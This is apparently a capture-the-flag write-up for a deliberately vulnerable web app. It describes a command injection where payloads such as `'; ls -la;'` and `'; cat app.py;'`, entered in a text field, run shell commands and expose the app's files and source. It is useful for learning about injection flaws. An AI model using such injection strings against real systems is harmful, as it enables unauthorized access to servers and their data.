# Source Code

## Description
This vulnerable web application is packaged as a docker image and executed as an Amazon ECS Task. The web app attempts to provide an 'encoded' value for text entered in a text entry field on the page.

## Solution
The challenge is to identify the command injection vulnerability in the application logic and craft appropriate injection strings to identify the flag in the system. Here are the steps I took to solve this challenge:

1. Entered `ls -la'`  
Service Returned: "Internal Server Error"
2. Entered `'; ls -la;'`  
Service Returned:  
 ```ls -la
total 24
drwxr-xr-x 1 root root 4096 Oct 27 02:34 .
drwxr-xr-x 1 root root 4096 Oct 14 03:58 ..
-rw-r--r-- 1 root root  437 Oct 14 03:21 Dockerfile
-rwxr-xr-x 1 root root  643 Oct 14 03:24 app.py
-rw-r--r-- 1 root root 1105 Oct 14 03:58 app.pyc
drwxr-xr-x 2 root root 4096 Oct 13 21:12 templates
```


3. Entered `'; cat app.py;'`  
Service Returned: App source code with clear indications on how to obtain a flag. :)
